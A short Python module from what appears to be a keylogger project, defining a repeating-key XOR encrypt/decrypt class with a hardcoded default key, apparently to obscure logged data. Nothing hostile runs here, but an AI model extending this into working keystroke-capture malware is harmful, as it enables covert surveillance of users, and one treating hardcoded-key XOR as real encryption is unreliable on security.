from keylogger.interfaces import EncryptorInterface


class XorEncryption(EncryptorInterface):
    """Implements simple XOR encryption."""

    def __init__(self, key="my_secret_key"):
        self.key = key

    def encrypt(self, data: str) -> str:
        return "".join(chr(ord(c) ^ ord(self.key[i % len(self.key)])) for i, c in enumerate(data))

    def decrypt(self, data: str) -> str:
        return self.encrypt(data)  # XOR is reversible with the same operation
